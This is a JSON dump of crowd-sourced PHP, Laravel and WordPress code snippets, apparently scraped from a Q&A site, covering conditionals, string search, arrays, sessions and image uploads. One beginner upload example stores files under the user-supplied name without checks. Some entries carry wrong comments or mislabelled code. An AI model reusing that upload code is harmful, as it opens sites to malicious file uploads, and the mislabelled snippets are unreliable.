    "id": 1814,
    "keyword": null,
    "link": null,
    "title": " ian holm",
    "description": "<?php //F ?>\n",
    "reg_date": "2021-10-12T10:15:09.000Z"
  },
  {
    "id": 1815,
    "keyword": null,
    "link": null,
    "title": " if any comma in string in php",
    "description": "php function strpos return position of string if it's not false or -1 then your string contain character.  $searchForValue = ','; $stringValue = '115,251';  if( strpos($stringValue, $searchForValue) !== false ) {      echo \"Found\"; }\n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1816,
    "keyword": null,
    "link": null,
    "title": " if any error in blade laravel",
    "description": " @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */ public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1817,
    "keyword": null,
    "link": null,
    "title": " if browser url is having query string after domain name in it check using php",
    "description": "$url = $_SERVER['REQUEST_URI'];  if (!strpos($url,'mysql')) { echo 'No mysql.'; //swapped with other echo statement } else { echo 'Mysql exists.'; }\n$url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];  if (!strpos($url,'mysql')) { echo 'No mysql.'; //swapped with other echo statement } else { echo 'Mysql exists.'; }\n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1818,
    "keyword": null,
    "link": null,
    "title": " if button is clicked php",
    "description": "if ($_SERVER['REQUEST_METHOD'] === 'POST') {     // Something posted      if (isset($_POST['btnDelete'])) {         // btnDelete     } else {         // Assume btnSubmit     } } \n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1819,
    "keyword": null,
    "link": null,
    "title": " if condition in php",
    "description": " <?php if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; } ?>  \n <?php if ($a > $b) {   echo \"a is bigger than b\";   $b = $a; } ?>  \n$a = random_int(0, 10); $b = random_int(0, 10); if ($a > $b) {   echo 'a is greater than b'; } elseif ($a == $b) {   echo 'a is equal to b'; } else {   echo 'a is less than b'; }\n easy way to execute conditional html / javascript / css / other language code with php if else:  <?php if (condition): ?>  html code to run if condition is true  <?php else: ?>  html code to run if condition is false  <?php endif ?>  \nif (condition) {   expression }\n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1820,
    "keyword": null,
    "link": null,
    "title": " if condition in smarty",
    "description": "{if isset($name) && $name == 'Blog'}      {* do something *} {elseif $name == $foo}     {* do something *} {/if}  {if is_array($foo) && count($foo) > 0}     {* do a foreach loop *} {/if}\n{if $userroleid eq 12 || $userroleid eq 13 || $userroleid eq 14 }     <a href=\"{$v.feature_url}\" class=\"re-upload\"> View</a> {else}     <a href=\"{$v.feature_url}\" class=\"re-upload\"> Re-upload</a> {/if} \n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1821,
    "keyword": null,
    "link": null,
    "title": " if condition inside echo in php",
    "description": "echo '<option value=\"'.$value.'\" '.(($value=='United States')?'selected=\"selected\"':\"\").'>'.$value.'</option>';\n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1822,
    "keyword": null,
    "link": null,
    "title": " if don't exist key json php",
    "description": " <?php $search_array = array('first' => 1, 'second' => 4); if (array_key_exists('first', $search_array)) {     echo \"The 'first' element is in the array\"; } ?>  \n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1823,
    "keyword": null,
    "link": null,
    "title": " if else if php code reflect",
    "description": "<?php $a = [ 'Canceled' => 1, 'Traded / Filled'=> 2, '(Not used currently)'=> 3, 'Transit'=> 4, 'Rejected'=> 5, 'Pending'=> 6, ]; echo array_search(\"5\",$a); ?> \n",
    "reg_date": "2021-10-12T10:15:10.000Z"
  },
  {
    "id": 1824,
    "keyword": null,
    "link": null,
    "title": " if else if ternary php",
    "description": "var name = (variable === 1) ? 'foo' : ((variable === 2) ? 'bar' : 'baz');\n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1825,
    "keyword": null,
    "link": null,
    "title": " if else radio button php",
    "description": "<form action=\"result.php\" method=\"post\">   Answer 1 <input type=\"radio\" name=\"ans\" value=\"ans1\" /><br />   Answer 2 <input type=\"radio\" name=\"ans\" value=\"ans2\"  /><br />   Answer 3 <input type=\"radio\" name=\"ans\" value=\"ans3\"  /><br />   Answer 4 <input type=\"radio\" name=\"ans\" value=\"ans4\"  /><br />   <input type=\"submit\" value=\"submit\" /> </form>    PHP code:  <?php  $answer = $_POST['ans'];   if ($answer == \"ans1\") {               echo 'Correct';       } else {     echo 'Incorrect'; }         ?>\n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1826,
    "keyword": null,
    "link": null,
    "title": " if exist php",
    "description": "if (isset($var)) {   // Code here }\n/**  * Returns a bool (true or false)  */ isset($x); /**  * Examples  */ $x = 'myValue'; if(isset($x)){ \techo 'x is set'; } /**  * this will echo out 'x is set'  */   $x = null; if(isset($x)){ \techo 'x is set'; } /**  * This will NOT echo out 'x is set'  */   if(isset($y)){  \techo 'y is set';  } /**  * This will NOT echo out 'y is set'  */  \n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1827,
    "keyword": null,
    "link": null,
    "title": " if field is filled out acf",
    "description": "<?php if( get_field('field_name') ): ?> \t<p>My field value: <?php the_field('field_name'); ?></p> <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1828,
    "keyword": null,
    "link": null,
    "title": " if first php",
    "description": "$x = 1; $length = count($data);   foreach($data as $value){         echo\"             <button class='btn\";                 if($x === 1){                     echo \" first\";                 }                 else if($x === $length){                     echo \" last\";                  }                 $x++;         echo\"            '>$value->services_name</button>         \";     }\n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1829,
    "keyword": null,
    "link": null,
    "title": " if i am using $ SERVER it shows 500 error",
    "description": "ini_set('display_errors', 1);\n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1830,
    "keyword": null,
    "link": null,
    "title": " if is alphabet php",
    "description": "ctype_alpha ( string $text ) : bool\n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1831,
    "keyword": null,
    "link": null,
    "title": " if language wpml",
    "description": "<?php if(ICL_LANGUAGE_CODE=='en'): ?> ---do something--- <?php elseif(ICL_LANGUAGE_CODE=='it'): ?> ---do something else-- <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1832,
    "keyword": null,
    "link": null,
    "title": " if name value contains space in php",
    "description": "if ($str == trim($str) && strpos($str, ' ') !== false) {     echo 'has spaces, but not at beginning or end'; }\n",
    "reg_date": "2021-10-12T10:15:11.000Z"
  },
  {
    "id": 1833,
    "keyword": null,
    "link": null,
    "title": " if notexists in laravel query",
    "description": "$user = User::where('email', '=', Input::get('email'))->first(); if ($user === null) {    // user doesn't exist }\nif (User::where('email', '=', Input::get('email'))->exists()) {    // user found }\n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1834,
    "keyword": null,
    "link": null,
    "title": " if online php",
    "description": "<?php echo ($requestVars->_name == '') ? $redText : ''; ?>\n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1835,
    "keyword": null,
    "link": null,
    "title": " if page is 404 laravel",
    "description": "//Access error code in view  @if(isset($exception) && $exception->getStatusCode() == 404)  @endif\n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1836,
    "keyword": null,
    "link": null,
    "title": " if part of stringp ph",
    "description": "$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1837,
    "keyword": null,
    "link": null,
    "title": " if php alternative syntax",
    "description": "<?php if ($a == 2): ?> ---do something ---  <?php elseif($a == 3): ?> ---do something else-- <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1838,
    "keyword": null,
    "link": null,
    "title": " if post php",
    "description": "if($_SERVER['REQUEST_METHOD'] == 'POST') {}\nif( isset($_POST['fromPerson']) ) {      $fromPerson = '+from:'.$_POST['fromPerson'];      echo $fromPerson; }  //Note: This resolves as true even if all $_POST values are empty strings if (!empty($_POST)) {     // handle post data     $fromPerson = '+from:'.$_POST['fromPerson'];     echo $fromPerson; }\n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1839,
    "keyword": null,
    "link": null,
    "title": " if text contains word then in php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\nif (strpos($haystack,$needle) !== false) {     echo \"$haystack contains $needle\"; }\n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n// returns true if $needle is a substring of $haystack function contains($haystack, $needle){     return strpos($haystack, $needle) !== false; }\n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1840,
    "keyword": null,
    "link": null,
    "title": " if url has certain code then php",
    "description": "if(strpos($_SERVER['REQUEST_URI'], \"string\")) {   ... }\nif (strpos($_SERVER['REQUEST_URI'], \"url word\") !== false){ // code }\n$url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];  if (!strpos($url,'mysql')) { echo 'No mysql.'; //swapped with other echo statement } else { echo 'Mysql exists.'; }\n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1841,
    "keyword": null,
    "link": null,
    "title": " if user logged in wordpress",
    "description": "if ( is_user_logged_in() ) {    // your code for logged in user  } else {    // your code for logged out user  }\n<?php  if ( is_user_logged_in() ) {   echo 'Welcome, logged in user. <a href=\"'.wp_logout_url().'\">Click here to logout</a>.'; }else{   echo 'Please login by <a href=\"'.wp_login_url().'\">clicking here</a>.' }\n<?php add_action('admin_init', 'wpse74389_check_username'); function wpse74389_check_username() {     $user = wp_get_current_user();      if($user && isset($user->user_login) && 'username_to_check' == $user->user_login) {         // do stuff     } } \n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1842,
    "keyword": null,
    "link": null,
    "title": " if value conatins in word check in php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\nif (strpos($haystack,$needle) !== false) {     echo \"$haystack contains $needle\"; }\n<?php $word = \"fox\"; $mystring = \"The quick brown fox jumps over the lazy dog\";   // Test if string contains the word  if(strpos($mystring, $word) !== false){     echo \"Word Found!\"; } else{     echo \"Word Not Found!\"; } ?>\n// returns true if $needle is a substring of $haystack function contains($haystack, $needle){     return strpos($haystack, $needle) !== false; }\n",
    "reg_date": "2021-10-12T10:15:12.000Z"
  },
  {
    "id": 1843,
    "keyword": null,
    "link": null,
    "title": " illuminate database queryexception could not find driver laravel",
    "description": "You might need to comment out the following in your php.ini file. ;extension=pdo_mysql.so  ############# OR ############## Other solution might be you may have a missing dependency  If you can, run : composer update  composer require doctrine/dbal \nIn Ubuntu (18.04)  apt install php-mysql   Happy coding #uzi :)\nsudo apt-get install php-sqlite3 \nsudo apt-get install php5.6-mysql/php7.2-mysql sudo apt-cache serch drivername\n",
    "reg_date": "2021-10-12T10:15:13.000Z"
  },
  {
    "id": 1844,
    "keyword": null,
    "link": null,
    "title": " image acf",
    "description": "<?php  $image = get_field('image'); if( !empty( $image ) ): ?>     <img src=\"<?php echo esc_url($image['url']); ?>\" alt=\"<?php echo esc_attr($image['alt']); ?>\" /> <?php endif; ?>\n<?php $image = get_field('image'); if( $image ):      // Image variables.     $url = $image['url'];     $title = $image['title'];     $alt = $image['alt'];     $caption = $image['caption'];      // Thumbnail size attributes.     $size = 'thumbnail';     $thumb = $image['sizes'][ $size ];     $width = $image['sizes'][ $size . '-width' ];     $height = $image['sizes'][ $size . '-height' ];      // Begin caption wrap.     if( $caption ): ?>         <div class=\"wp-caption\">     <?php endif; ?>      <a href=\"<?php echo esc_url($url); ?>\" title=\"<?php echo esc_attr($title); ?>\">         <img src=\"<?php echo esc_url($thumb); ?>\" alt=\"<?php echo esc_attr($alt); ?>\" />     </a>      <?php      // End caption wrap.     if( $caption ): ?>         <p class=\"wp-caption-text\"><?php echo esc_html($caption); ?></p>         </div>     <?php endif; ?> <?php endif; ?>\n<div class=\"about_photo\"> \t\t<?php \t\t$value =get_field('about_photo'); \t\t echo \"<img src='\".$value.\"' width='200px' height='200px'>\"; \t\t ?> </div>\n",
    "reg_date": "2021-10-12T10:15:13.000Z"
  },
  {
    "id": 1845,
    "keyword": null,
    "link": null,
    "title": " image dimension when uploading in laravel validation",
    "description": "$this->validate($request, [    'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048|dimensions:width=500,height=500',]);\n",
    "reg_date": "2021-10-12T10:15:13.000Z"
  },
  {
    "id": 1846,
    "keyword": null,
    "link": null,
    "title": " image upload form",
    "description": "<form action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\">     <label>Select Image File:</label>     <input type=\"file\" name=\"image\">     <input type=\"submit\" name=\"submit\" value=\"Upload\"> </form>\n//This is the minimal code for an image upload for first time learners //html portion <!DOCTYPE html> <html> <head> \t<title>ImageUpload</title> </head> <body> \t<form action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\"> \t\t<label>Username</label> \t\t<input type=\"text\" name=\"username\"> \t\t<br> \t\t<label>UploadImage</label> \t\t<input type=\"file\" name='myfile'> \t\t<br/> \t\t<input type=\"submit\" value=\"upload\"> \t</form> </body> </html>     //php portion   <?php \t$user=$_POST['username']; \t$image=$_FILES['myfile']; \techo \"Hello $user <br/>\"; \techo \"File Name<b>::</b> \".$image['name'];  \tmove_uploaded_file($image['tmp_name'],\"photos/\".$image['name']); \t//here the \"photos\" folder is in same folder as the upload.php,  \t//otherwise complete url has to be mentioned \t?>\n",
    "reg_date": "2021-10-12T10:15:13.000Z"
  },
  {
    "id": 1847,
    "keyword": null,
    "link": null,
    "title": " image upload with name change in php",
    "description": "$temp = explode(\".\", $_FILES[\"file\"][\"name\"]); $newfilename = round(microtime(true)) . '.' . end($temp); move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"../img/imageDirectory/\" . $newfilename);\n",
    "reg_date": "2021-10-12T10:15:13.000Z"
  },
  {
    "id": 1848,
    "keyword": null,
    "link": null,
    "title": " image uploading and validation php",
    "description": " /***********************************************************************************************/     $image = $_FILES['image']['name'];     $imageFlag = true;     if (empty($image)) {       /*  if($gender == \"male\")             $imageName = 'default1.jpeg';         else             $imageName = 'default2.png';*/         $imageFlag = false;     } else {           $file_extension = strtolower(pathinfo($_FILES[\"image\"][\"name\"], PATHINFO_EXTENSION));          $allowed_image_extension = array(             \"jpeg\",             \"png\",             \"jpg\"         );         // Get Image Dimension         $fileinfo = @getimagesize($_FILES[\"image\"][\"tmp_name\"]); //$fileinfo var contains an array of info about the image         $width = $fileinfo[0]; //array at index 0 contains the width of image         $height = $fileinfo[1];  // array index 1 contains the height of image         /*check image diamentions*/         if ($width > 1500 || $height > 1600 || $width > $height) {             $output['error']['image'] = \"* image dimensions should be less than 400*500 and width should be less than height i.e passport size image\";             $imageFlag = false;          }          /*check image extension*/         if (!in_array($file_extension, $allowed_image_extension)) {             $imageFlag = false;             $output['error']['image'] = \"Only jpg , jpeg and png format are allowed\";         }         /*Check image size*/         if (($_FILES[\"image\"][\"size\"] > 20000000)) {             $imageFlag = false;             $output['error']['image']= \"Image size should be less than 2mb\";         }         if ($imageFlag) {             /*or uniqueid*/             $imageName = time() . 'Teacher.' . $file_extension;             $target = (\"images/teacher/\" . basename($imageName));             $m = move_uploaded_file($_FILES['image']['tmp_name'], $target);/*moves the image into the server*/          }      }     /*****************************************************************************/\n",
    "reg_date": "2021-10-12T10:15:13.000Z"
  },
  {
    "id": 1849,
    "keyword": null,
    "link": null,
    "title": " image validate in laravel validater",
    "description": "'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',\n$this->validate($request, ['file' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',]); \n$validate = Validator::make($params = $request->all(), [   'type' => 'required',   'files' => 'mimes:jpeg,png,jpg,svg,doc,docx,odt,pdf,tex,txt,wpd,tiff,tif,csv,psd,key,odp,pps,ppt,pptx,ods,xls,xlsm,xlsx' ]);\n",
    "reg_date": "2021-10-12T10:15:13.000Z"
  },
  {
    "id": 1850,
    "keyword": null,
    "link": null,
    "title": " imagick php",
    "description": "<?php $im = new Imagick(); $im->setResolution( 300, 300 ); $im->readImage( \"test.pdf\" ); ?>\n",
    "reg_date": "2021-10-12T10:15:13.000Z"
  },
  {
    "id": 1851,
    "keyword": null,
    "link": null,
    "title": " img src php",
    "description": "<?php  while($row = mysqli_fetch_array($result)){                            echo '                                <tr>                                     <td> '.$row['x'].' </td>                               <td> '.$row['y'].' </td>                               <td> '.$row['z'].' </td>                               <td> '.$row['f'].' </td>                               <td> '.$row['g'].' </td>                               <td> '.$row['d'].' </td>                               <td><img src=\"'.$url.'\"/></td>                               </tr>'; } ?>\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1852,
    "keyword": null,
    "link": null,
    "title": " img src php wordpress",
    "description": "/*Va directement dans le repertoire du theme parent puis dossier img*/ src=\"<?php bloginfo('template_url'); ?>/imag/chat.png\"\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1853,
    "keyword": null,
    "link": null,
    "title": " implode and explode in php",
    "description": "<html>   <body bgcolor=\"pink\">   <h3>Implode Function</h3>   <?php   $arr=array ('I','am','simple','boy!');   echo implode(\" \",$arr);   $str=\"I am simple boy!\";   print_r(explode(\" \",$str));   ?>   </body>   </html> \n$arr = ['Thor','Captain America','Iron Man']; echo implode(', ',$arr); // \"Thor, Captain America, Iron Man\"\n<?php $str = \"Hello world. It's a beautiful day.\"; $split = explode(\" \",$str); $hello = $split[0]; $world = $split[1]; ?>\nExplode in PHP\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1854,
    "keyword": null,
    "link": null,
    "title": " implode php",
    "description": "$array = array('banana', 'strawberry', 'apple'); comma_separated  = implode(\",\", $array); echo comma_separated; // banana,strawberry,apple\n$arr = array('Hello','World!','Beautiful','Day!'); echo implode(\" \",$arr); // Outputs: 'Hello World! Beautiful Day!'\n$values = array_map('array_pop', $array); $imploded = implode(',', $values); \n$arr = array('Hello','World!','Beautiful','Day!'); echo join(\",\",$arr);\n$colors = array(\"red\",\"blue\",\"green\"); $colorsCSV= \"'\".implode(\"','\",$colors).\"'\"; //$colorsCSV: 'red','blue','green'\n$arr = ['Thor','Captain America','Iron Man']; echo implode(', ',$arr); // \"Thor, Captain America, Iron Man\"\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1855,
    "keyword": null,
    "link": null,
    "title": " import hash laravel",
    "description": "<?php  namespace App\\Http\\Controllers;  use App\\Http\\Controllers\\Controller; use Illuminate\\Http\\Request; use Illuminate\\Support\\Facades\\Hash;  class PasswordController extends Controller {     /**      * Update the password for the user.      *      * @param  \\Illuminate\\Http\\Request  $request      * @return \\Illuminate\\Http\\Response      */     public function update(Request $request)     {         // Validate the new password length...          $request->user()->fill([             'password' => Hash::make($request->newPassword)         ])->save();     } }\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1856,
    "keyword": null,
    "link": null,
    "title": " import session laravel",
    "description": "use Illuminate\\Support\\Facades\\Session;\n$request->session()->put('key','value'); \n//store multipal data Session::put('user', ['first_name' => $request->get('first_name'), 'user_role' => Auth::user()->user_role, 'city' => Auth::user()->city]);  //in blade template <p>   {{Session::get('user')['city']}} </p>  @foreach (Session::get('user') as $user) \t{{$user}} @endforeach  //condtion check @if(Session::has('user'))   @foreach (Session::get('user') as $user)   \t{{ $user }}   @endforeach @endif // condition check using ternary operator {{ (Session::has('user')) ? 45 : 55}}  //delete session Session::forget('customer'); //@sujay\nsession(['name' => 'data']);\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1857,
    "keyword": null,
    "link": null,
    "title": " importing current year in laravel blade",
    "description": "{{ now()->year }}\n{{ date('Y') }}\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1858,
    "keyword": null,
    "link": null,
    "title": " in array",
    "description": "<?php /** in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool */  $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Got Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Got mac\"; } ?>  \n<?php   $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\");   if (in_array(\"Irix\", $os)) {       echo \"Got Irix\";   }   if (in_array(\"mac\", $os)) {       echo \"Got mac\";   } ?>\n <? in_array(\"Irix\", $os); ?>  \n<?php $people = array(\"Peter\", \"Joe\", \"Glenn\", \"Cleveland\");  if (in_array(\"Glenn\", $people))   {   echo \"Match found\";   } else   {   echo \"Match not found\";   } ?>\nPHP function in_array(mixed $needle, array $haystack, bool $strict = false) bool ---------------------------------------------------------------------------- Checks if a value exists in an array    Parameters: mixed--$needle--The searched value. If needle is a string, the comparison is done in a case-sensitive manner. array--$haystack--The array. bool--$strict--[optional].If the third parameter strict is set to true then the in_array function will also check the types of the needle in the haystack.  Returns: true if needle is found in the array, false otherwise.    Example: ---------    $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Got Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Got mac\"; }\nin_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1859,
    "keyword": null,
    "link": null,
    "title": " in array in php",
    "description": "$myArr = [38, 18, 10, 7, \"15\"];  echo in_array(10, $myArr); // TRUE echo in_array(19, $myArr); // TRUE  // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n<?php $os = array(\"Apple\", \"Banana\", \"Lemon\"); if (in_array(\"Apple\", $os)) {     echo \"Yeah. Exist Apple\"; } if (!in_array(\"Buleberry\", $os)) {     echo \"Oh, Don't Exist Blueberry!!!\"; } ?>\n$colors = array(\"red\", \"blue\", \"green\");    if (in_array(\"red\", $colors)) {  \techo \"found red in array\";  } \n$errors = array(             0 => 'OK',             1 => 'Неверный xml',             2 => 'Широта не указана',             3 => 'Долгота не указана',             4 => 'Дата и время запроса не указаны',             5 => 'Точность не указана',             6 => 'Идентификатор телефона не указан',             7 => 'Идентификатор телефона не найден',             8 => 'Неверная широта',             9 => 'Неверная долгота',             10 => 'Неверная точность',             11 => 'Заказы не найдены',             12 => 'Неверные дата и время запроса',             13 => 'Ошибка mysql',             14 => 'Неизвестная функция',             15 => 'Тариф не найден',             18 => 'Город отправления не указан',             19 => 'Город назначения не указан',             20 => 'Неверная масса',             21 => 'Город отправления не найден',             22 => 'Город назначения не найден',             23 => 'Масса не указана',             24 => 'Логин не указан',             25 => 'Ошибка авторизации',             26 => 'Логин уже существует',             27 => 'Клиент уже существует',             28 => 'Адрес не указан',             29 => 'Более не поддерживается',             30 => 'Настройка sip не выполнена',             31 => 'Телефон не указан',             32 => 'Телефон курьера не указан',             33 => 'Ошибка соединения',             34 => 'Неверный номер',             35 => 'Неверный номер',             36 => 'Ошибка определения тарифа',             37 => 'Ошибка определения тарифа',             38 => 'Тариф не найден',             39 => 'Тариф не найден',         );          return isset($errors[$code]) ? $errors[$code] : 'Неизвестная ошибка';\n<?php /** in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool */  $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Got Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Got mac\"; } ?>  \nin_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool    // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1860,
    "keyword": null,
    "link": null,
    "title": " in array php",
    "description": " <?php $yes = array('this', 'is', 'an array');  echo is_array($yes) ? 'Array' : 'not an Array'; echo \"\\n\";  $no = 'this is a string';  echo is_array($no) ? 'Array' : 'not an Array'; ?>  \n$myArr = [38, 18, 10, 7, \"15\"];  echo in_array(10, $myArr); // TRUE echo in_array(19, $myArr); // TRUE  // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n<?php $os = array(\"Apple\", \"Banana\", \"Lemon\"); if (in_array(\"Apple\", $os)) {     echo \"Yeah. Exist Apple\"; } if (!in_array(\"Buleberry\", $os)) {     echo \"Oh, Don't Exist Blueberry!!!\"; } ?>\n$colors = array(\"red\", \"blue\", \"green\");    if (in_array(\"red\", $colors)) {  \techo \"found red in array\";  } \n$errors = array(             0 => 'OK',             1 => 'Неверный xml',             2 => 'Широта не указана',             3 => 'Долгота не указана',             4 => 'Дата и время запроса не указаны',             5 => 'Точность не указана',             6 => 'Идентификатор телефона не указан',             7 => 'Идентификатор телефона не найден',             8 => 'Неверная широта',             9 => 'Неверная долгота',             10 => 'Неверная точность',             11 => 'Заказы не найдены',             12 => 'Неверные дата и время запроса',             13 => 'Ошибка mysql',             14 => 'Неизвестная функция',             15 => 'Тариф не найден',             18 => 'Город отправления не указан',             19 => 'Город назначения не указан',             20 => 'Неверная масса',             21 => 'Город отправления не найден',             22 => 'Город назначения не найден',             23 => 'Масса не указана',             24 => 'Логин не указан',             25 => 'Ошибка авторизации',             26 => 'Логин уже существует',             27 => 'Клиент уже существует',             28 => 'Адрес не указан',             29 => 'Более не поддерживается',             30 => 'Настройка sip не выполнена',             31 => 'Телефон не указан',             32 => 'Телефон курьера не указан',             33 => 'Ошибка соединения',             34 => 'Неверный номер',             35 => 'Неверный номер',             36 => 'Ошибка определения тарифа',             37 => 'Ошибка определения тарифа',             38 => 'Тариф не найден',             39 => 'Тариф не найден',         );          return isset($errors[$code]) ? $errors[$code] : 'Неизвестная ошибка';\n<?php $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Existe Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Existe mac\"; } ?>\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1861,
    "keyword": null,
    "link": null,
    "title": " in array php multiple values",
    "description": "function in_array_any($needles, $haystack) {    return !empty(array_intersect($needles, $haystack)); }  echo in_array_any( [3,9], [5,8,3,1,2] ); // true, since 3 is present echo in_array_any( [4,9], [5,8,3,1,2] ); // false, neither 4 nor 9 is present \n$haystack = array(...);  $target = array('foo', 'bar');  if(count(array_intersect($haystack, $target)) == count($target)){     // all of $target is in $haystack }  if(count(array_intersect($haystack, $target)) > 0){     // at least one of $target is in $haystack }\n",
    "reg_date": "2021-10-12T10:15:14.000Z"
  },
  {
    "id": 1862,
    "keyword": null,
    "link": null,
    "title": " in array validation laravel",
    "description": "$data = $request->validate([     \"name\"    => \"required|array|min:3\",     \"name.*\"  => \"required|string\", ]);\nI found a better solution. The validate in_array expects the array to be one of the parameters in the request. The in: answer will not work if you have  commas in the array. To use the in_array without having to create a new rule  you can simply do: ( Make sure you include the .* at the end )  $this->allslots = array('10:00:00', '10:10:00', '10:20:00', '10:30:00', '10:40:00', '10:50:00', '11:00:00', '11:10:00', '11:20:00', '11:30:00', '11:40:00', '11:50:00', '12:00:00', '12:10:00', '12:20:00', '12:30:00', '12:40:00', '12:50:00', '13:00:00', '13:10:00', '13:20:00', '13:30:00', '13:40:00', '13:50:00', '14:00:00', '14:10:00', '14:20:00', '14:30:00', '14:40:00', '14:50:00', '15:00:00', '15:10:00', '15:20:00', '15:30:00', '15:40:00', '15:50:00', '16:00:00', '16:10:00', '16:20:00', '16:30:00', '16:40:00', '16:50:00');  $request['allslots'] = $this->allslots;  validate($request, [   'field' => 'required|in_array:allslots.*', ]);\nin:foo,bar,...  The field under validation must be included in the given list of values. Since  this rule often requires you to implode an array, the Rule::in method may be  used to fluently construct the rule:  'field' => 'required|in:' . implode(',', ['value1', 'value2']),\nuse Illuminate\\Support\\Facades\\Validator;  $input = [     'user' => [         'name' => 'Taylor Otwell',         'username' => 'taylorotwell',         'admin' => true,     ], ];  Validator::make($input, [     'user' => 'array:username,locale', ]);\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1863,
    "keyword": null,
    "link": null,
    "title": " in date function + 1 month and - 1 day in php",
